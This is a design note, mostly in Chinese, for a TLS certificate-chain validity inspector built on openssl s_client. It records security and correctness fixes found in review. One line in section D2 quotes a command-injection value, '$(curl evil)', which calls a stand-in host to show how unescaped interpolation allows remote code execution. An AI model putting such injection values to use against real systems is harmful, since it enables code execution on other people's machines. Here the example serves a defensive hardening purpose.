# Design — net.tls.chain_validity

## Context

net 域已有 `net.tls.cert_expiry`(只看 `notAfter` 剩余天数)。本变更补 chain validity 探针:用 `openssl s_client` 拿系统信任库对完整证书链的验证结论(verify return code),覆盖「叶子没过期但中间 CA 缺失 / 链顺序错 / 自签未受信」这类握手失败 —— 这是 `cert_expiry` 看不见的故障。

这是一个**纯 YAML、单 inspector** 的增量,归既有 `os-shell-inspector-suite` 契约管辖,不引入新基础设施。但探索阶段(对抗性 review,Security Engineer)在初版 proposal 的 manifest 示例里发现了**真注入面**和几处 openssl 语义误用 —— 本设计记录订正后的决策与理由,避免实现时重新踩。

约束(继承项目铁律):
- string 参数**两道防线**:`pattern` 收紧值域(挂在 JSON Schema `properties` 下)+ collector 里 `{{ x | sh }}`(shlex.quote)。缺一不可。
- os-shell fixture 是**录制/手写 stdout**经 ReplayTarget 回放,**不打真实网络**;replay 锁不住 collector shell 在真机跑对 → 必须配真机 Demo Path。
- 改已有契约要更新 spec;本变更不改 schema/capability/parse 枚举,只追加 suite 的一条增量需求。

## Goals / Non-Goals

**Goals**
- 单端点 chain validity 诊断探针,与 `cert_expiry` 职责互补。
- 收紧注入面到与既有 net inspector 同等强度(pattern + `| sh`)。
- 跨 openssl 实现(OpenSSL 3.x / LibreSSL)稳定解析 `Verify return code`。

**Non-Goals**
- 不做 OCSP/CRL 吊销、不做 cipher/protocol 合规扫描。
- 不自带 CA bundle(用目标系统信任库)。
- 不替代/合并 `cert_expiry`。
- 不支持多端点数组(见 Decision 5 —— 诊断形态刻意单点)。

## Decisions

### D1 — `parameters` 用 JSON-Schema 包裹风格,不用扁平写法(安全阻塞项)

`schema.py` 把 manifest 的 `parameters` 当 JSON Schema、用 `Draft202012Validator.check_schema()` 校验。初版 proposal 写成扁平:

```yaml
parameters:
  endpoint: { type: string, pattern: "..." }   # ← endpoint 不是 JSON Schema 关键字
```

顶层 `endpoint` 不是 schema 关键字 → 被当未知 annotation **忽略**,`check_schema` 照样过。后果:`runner._apply_schema_defaults` / `_coerce_parameters` 读 `schema["properties"]` 取不到 → `pattern` 约束与 `default` **静默失效**,`jsonschema.validate` 用一个无约束 schema 校验 → 任意 endpoint 字符串都过。

**决定**:抄 sibling `cert_expiry` 的 `type: object / required / properties / additionalProperties: false`,把 `pattern` 挂进 `properties`。

**替代方案**:在 schema.py 加「拒绝顶层非 JSON-Schema 键」的校验,让扁平写法显式报错。**否决** —— 那是改全局契约修一个本提案的笔误,范围蔓延;且现有所有 manifest 已是包裹风格,无需迁就。

### D2 — collector string 参数必须 `{{ x | sh }}`,且这是与 D1 并列的第二道防线(安全阻塞项)

初版 collector 是 `-connect "{{ endpoint }}"` —— 裸 Jinja 插值,**无 `| sh`**。双引号挡得住分号/空格,挡不住 `$(...)`/反引号:`endpoint='$(curl evil)'` 在双引号内会被命令替换执行 → **RCE**。

全仓 SOT(`jvm/threads.yaml` 注释):int 参数可裸插(无注入面),string 参数 **MUST** 走 `| sh`。所有 6 个现存 net inspector 的 string 参数都走 `map('sh')`/`| sh`。

**决定**:`{{ endpoint | sh }}`。D1(pattern)与 D2(`| sh`)**都要**——pattern 收值域、`| sh` 兜底引用,单独任一不达标。

**边界(M6)**:SNI 的 `$host`/`$sni` 是 shell 内从 endpoint **派生**的变量,`| sh` filter **不覆盖**它们(filter 只作用于 Jinja 插值点 `{{ endpoint | sh }}`)。这条派生路径的安全**仅靠 endpoint pattern** 把值域收成 `^[A-Za-z0-9._-]+:[0-9]{1,5}$`(无 glob/空格/`$()` 能进 `$host`)。spec/proposal 须显式声明此路径不靠 `| sh`,免得「两道防线」被误读为派生变量也双保险。

### D3 — 删掉 `-verify 5`;`s_client` 默认即验证(纠正 openssl 语义误用)

`openssl s_client -verify N` 的 `N` 是**验证深度上限**,不是「开启验证」开关。`s_client` 默认就验证并打印 `Verify return code`。`-verify 5`(深度 5)对跨多级中间 CA 的合法长链会误判 `code 22 (certificate chain too long)` → **假阳**。

**决定**:不传 `-verify`,直接读默认验证结果。也**不用** `-verify_return_error`(它让验证失败→s_client 非零退出,会把「链断」这个**应是 finding** 的情况错误地推向 exception 路径,见 R2)。

**盲区(B3,见 D9)**:「默认即验证」**不等于**「默认即能判链有效性」。openssl 对「无 peer cert / 非 TLS 端口 / 半握手」也打 `Verify return code: 0`(verify 0 = 没验出错,非「验过链」)。故 D3 只解决「怎么触发验证」,**B3/D9** 才解决「verify 0 是否可信」——二者缺一会假阴。

### D4 — `parse.format: raw` + `raw_extract_regex`,不在 shell 里 `printf` 拼 JSON(纠正正确性)

初版 collector 用 `printf '{"reason":"%s"}' "$reason"` 把 openssl 文本拼进 JSON。`reason` 未转义,含 `"`/`\`(LibreSSL 措辞不同)会破 JSON → `json.JSONDecodeError` → 一个**合法的链断 finding 被误判成 exception(漏报链断,安全相关)**。

**决定**:collector 只 `printf '%s' "$out"` 把 openssl 整段文本交出,`parse.format: raw` + 命名组 `raw_extract_regex` 抽 `verify_code`/`reason`。绕开 shell 拼 JSON 的转义地狱;regex 走 schema 层的 ReDoS gate。

**raw 路径的两个硬约束(B1/B2,review 发现)**:
- **B1 必带 `columns`**:`schema.py:354` 规定 `raw` 格式 + `raw_extract_regex` **必须**声明非空 `columns`,且 named-group 数须 == `len(columns)`(`schema.py:422`)。漏写 `columns` → manifest **load 即崩**、registry errors≠[]。故 `columns: [verify_code, reason]`。
- **B2 字段恒为 str**:`parse_raw` 用 `match.group(col)` 取值,**永远是字符串**(`parsers/raw.py:45`),非 match 时为 `null`。所以 ① `output_schema.verify_code` 必须 `type: string`(写 `integer` → jsonschema 拒 → **每次运行都 exception**、永远跑不出 ok)②finding DSL 必须字符串比较 `when: "verify_code != '0'"`(写 `!= 0` → simpleeval `"0" != 0 == True` → **有效链反而误报 critical**)。这与 sibling `cert_expiry` 不同:它用 `format: json` + shell 内 `$(( ))` 算整数,天然规避 B1/B2;raw 路径**不能照搬整数语义**。

**替代方案**:① 保留 json 格式但对 reason 做 shell 转义。**否决** —— shell 里手写 JSON 转义脆且易漏。② 学 sibling 用 `format: json` + shell 内拼 JSON。**否决** —— 正是 D4 要避免的 shell-JSON 转义地狱(reason 含特殊字符破 JSON → 假 exception);raw+regex 是被 schema 层加固的正路,代价是 B1/B2 的 str 语义须显式处理。

### D5 — 单 endpoint(string),不做数组(诊断形态)

`cert_expiry` 用 `endpoints: array` 是「批量过期日历」的巡检形态;chain validity 是「这一个端点为什么握手失败」的**单点诊断**形态。单 endpoint 更贴诊断意图,也更简单。

**实现陷阱(记录)**:单 endpoint = aggregate finding(无 `for_each`)。`schema.py` 禁止 aggregate message 用 `{var.attr}` 语法 → message 模板只能用裸 `{verify_code}`/`{reason}`(从 output dict 顶层取),**强烈建议带上 `{reason}`**,否则 Agent 看不到根因(`unable to get local issuer certificate` 这类)。

### D6 — code 10(过期)不排除;正交靠职责声明而非码值互斥(定调)

`openssl verify` 对过期证书返回 code 10,所以过期叶子会**同时**触发 chain_validity 和 cert_expiry。排除 code 10 会制造盲区(只调度 chain_validity 时过期没人报)。

**决定**:不排除。措辞从「二者正交」改为「**职责互补、可重叠**」:cert_expiry 答「还剩几天(含未过期预警)」,chain_validity 答「现在能不能被信任(过期=不可信的一种)」。重叠是**交叉印证**,不是噪音。

**区分文案靠 `{reason}` 自带,不另开 code 分支(M4 修正)**:本 inspector 是**单档 critical**(D8),message 是统一模板 `"...(code {verify_code}: {reason})"`。code 10 的 `{reason}` 在运行时就是 `certificate has expired`,**已自带区分性**——不另写 code-10 专属 message 分支(那会把诊断判断下沉到采集层,违反 D8)。「指向 cert_expiry 看剩余天数」是 **Diagnostician/Agent 关联层**的职责(§4.2),不是 inspector message 的承诺。初稿「finding message 对 code 10 给区分性文案」是 over-promise,删。

### D7 — SNI 从 endpoint 的 host 切,删 `servername` 参数;纯 IPv4 端点不发 SNI(已定)

初版 `${servername:+-servername "{{ servername }}"}` 是 shell 参数扩展死代码:`servername` 是 Jinja 值非 shell 变量,恒展开为空 → SNI 永不发。SNI 不发会让多租户 HTTPS 拿到默认证书 → **验错证书**(假阴/假阳)。

**决定**:删 `servername` 参数,在 shell 内 `host` 从 endpoint 切出。**仅当 `host` 是 hostname(含字母)时发 `-servername "$host"`;纯 IPv4 字面量端点跳过 SNI**。核心理由是 **镜像真实客户端行为**:真实浏览器访问 `https://1.2.3.4` 从不发 SNI、拿默认证书,我们也不发、验同一张证书的链 —— 这样 chain_validity 验的就是「真实客户端会看到的那条链」。endpoint pattern `[A-Za-z0-9._-]+` 不含 `:`,**IPv6 字面量已被排除**,故只需区分 IPv4 vs hostname(`case "$host" in *[A-Za-z]*) 发 SNI ;; *) 不发 ;;`)。host 在 shell 内从已被 `| sh` 引用的 endpoint 派生,不新增注入面。

**IP 证书不受影响(对抗性确认)**:SNI 只选「给哪张证书」,`Verify return code` 是「返回的链可不可信」(默认**不**做 IP/hostname 名称匹配,未传 `-verify_ip`)。对真正用 IP-SAN 证书的端点(如 `1.1.1.1`),不发 SNI 拿到的默认证书就是那张 IP 证书 → 验其链 → 可信即 code 0,无误判。反而**发** IP-SNI 才危险:RFC 6066 禁 IP-SNI,部分 TLS 栈会 abort 握手 → 假阳。

**替代方案**:① 像 sibling 一样无条件 `-servername "$host"`。**否决** —— sibling 对 IP 端点发 IP-SNI 是潜在 bug,本 inspector 不继承。② 保留可选 `servername` 参数支持「连 IP、发自定义 SNI」。**v1 否决、留扩展** —— power-user 诊断场景,可后续作为可选参数非破坏性追加(届时 Jinja `{% if %}` 而非 shell `${:+}`);v1 覆盖「验 hostname:port」95% 场景。**已列入 Non-Goals。**

## Risks / Trade-offs

- **R1 LibreSSL 解析漂移** → macOS 自带 `/usr/bin/openssl` 是 LibreSSL,而 `targets:` 含 `local` → local 必撞 LibreSSL。`Verify return code` 行的措辞/间距跨实现会变。→ **缓解**:用正则捕获数字(`Verify return code:\s*(\d+)`)而非字段位置锚(初版 `awk '{print $5}'` 脆);fixture **必录 OpenSSL 3.x + LibreSSL 两份** stdout 回归。
- **R2 exit≠0 不映射 exception + 解析失败机理(M3 纠正)** → `runner` 不看命令 `exit_code`(只看连接级 `TargetError` 和 `timeout`)。且 `parse_raw` 非 match **不抛异常**、返 `{verify_code: null}`(`raw.py:44`)——exception 实际来自**后续 output_schema 拒 null**(`required` + `type: string`),**不是**「解析失败」。→ **缓解**:proposal/spec 机理文案改为「非 match → null → output_schema 拒 → exception」;`output_schema` 的 `required: [verify_code]` + 非 null 类型是这条 fail-loud 的**承重件**,改 schema 时不可松动(松了会让无证书路径变 silent ok = B3 回归);失败分支须不打印任何可被 regex 命中的输出。
- **R3 fixture 锁不住 collector shell** → replay 只回放 stdout,验不了 collector 命令在真机跑对。→ **缓解**:proposal 删「公网可信站点」误导措辞、改「录制/手写样本」;补真机 Demo Path(对 badssl.com 之类有效链 + 缺中间 CA 端点各跑一次)。
- **R4 `echo |` 握手仍可能 block 到 timeout** → 对慢握手/需服务端先说话的协议,`echo` 给 EOF 不一定让 s_client 立即退。→ **缓解**:`timeout_seconds: 10` 兜底;沿用 sibling 的 `echo |` 约定(可接受),单端点不放大。

## Migration Plan

无运行时迁移。纯增量:新增 `builtin/net/tls_chain_validity.yaml` + fixture + loader/capability-gate 断言扩展。回滚 = 删文件;registry 减 1,无契约破坏。`openssl` 缺失走既有 `requires_binaries` preflight → `requires_unmet` skip。

### D8 — 单档 critical,不在采集层分 severity(已定)

sibling `cert_expiry` 分 warn/critical 是**连续指标(天数)按阈值分桶**。chain_validity 的 `verify_code` 是**离散信任失败枚举** —— 任意非零都等于「此刻链不被信任库验证通过」,是二值信任失败。把 code 18/19(自签)vs 20(缺 issuer)vs 10(过期)分档是**诊断判断**,按 §4.2 应留给 Diagnostician/Agent 关联层,采集层不预判(否则违反「Inspector 只采集+结构化,推理留给 Agent」)。

**决定**:所有 `verify_code != '0'`(字符串比较,见 D4 B2)→ 单档 **critical**;`reason` 串携带区分信息供 Agent 后续分级。

**替代方案**:对 code 10(过期)/18/19(自签)降 warning。**否决** —— 采集层预判 severity 是把诊断逻辑下沉到传感器,与项目反模式冲突。

### D9 — B3 假阴防护下沉到 parser regex:要求先见证书 PEM 再读 verify 行(安全阻塞项)

**根因**:review 实测发现 openssl 对「无 peer cert / 纯 TCP 非 TLS 端口 / 半握手」**照样打 `Verify return code: 0 (ok)`** —— verify code 0 的语义是「没验出错」,不是「验过了一条链」。初稿的 fail-loud 模型假设「不通 = 空 stdout」是**错的前提**:这些情形 stdout 非空、还含 code 0,会被解析成「链有效」→ `status=ok` 无 finding,正是 spec 明禁的**关键假阴**(把非 TLS 端口报成链 OK)。sibling `cert_expiry` 侥幸免疫:它后接 `openssl x509 -noout -enddate`,无证书时该步失败兜底;本 inspector 没有这一步。

**决定**:把守门放进 **`raw_extract_regex`**,而非 collector shell——regex 要求 `-----BEGIN CERTIFICATE-----` 标记在 `Verify return code` 行**之前**出现:

```
-----BEGIN CERTIFICATE-----[\s\S]*?Verify return code:\s*(?P<verify_code>\d+)\s*\((?P<reason>[^)]*)\)
```

`parse_raw` 用 `re.search` 跑**整段** stdout(`raw.py:42`,无 DOTALL 但 `[\s\S]` 跨行)。无证书文本(`no peer certificate available` + code 0,无 PEM)→ regex 不匹配 → `{verify_code: null}`(`raw.py:44`)→ output_schema 拒 null → `status=exception`。s_client 默认就打印 server cert 的 PEM(OpenSSL/LibreSSL 皆然),有证书时该标记必在。

**为何放 parser 而非 collector grep(关键)**:`_CaptureTarget` 不执行 collector shell(D-7),故 collector 里的 `grep` 守门在 **offline 测不了** → 只能命令串级锁 + 真机验证(伪验收风险)。而 `parse_raw` 的 `re.search` 在 **offline 会执行** → 无证书 fixture(作者写无 PEM 的文本)→ regex 真的不匹配 → 真的落 exception → **B3 offline 可证**。这把一个本该「真机才验得了」的安全防护变成「replay 就锁死」。

**ReDoS 门验证**:`[\s\S]*?` 是单层 MIN_REPEAT(非嵌套)、非空匹配、无 assert/branch/groupref;长度 101<200。过 `_detect_redos_pattern` 四层门(`schema.py:389`)。named group 仍 2 个 == `len(columns)`。

**替代方案**:① collector `grep BEGIN CERTIFICATE || exit 1`。**否决** —— offline 测不了(见上),且多一段 shell 逻辑。② `-verify_return_error` 让无效时非零退出。**否决** —— 把「链断(应是 finding)」也推成 exception,混淆「链断」与「连不上」(D3)。③ 把「无证书」当 critical finding。**否决** —— exception(无法评估)比 critical(判坏)更诚实:「没拿到证书」是「测不了」非「测出坏链」,与「不通→exception」一致。

## Open Questions

(无 —— D7/D8 原 Open Questions 已定;命名见下。)

- **inspector 命名(已定)**:`net.tls.chain_validity`(三段,对齐 sibling `net.tls.cert_expiry`)而非初版 `net.tls_chain_validity`(两段)。schema name pattern 两者都收,纯一致性决定 —— 采用三段式。
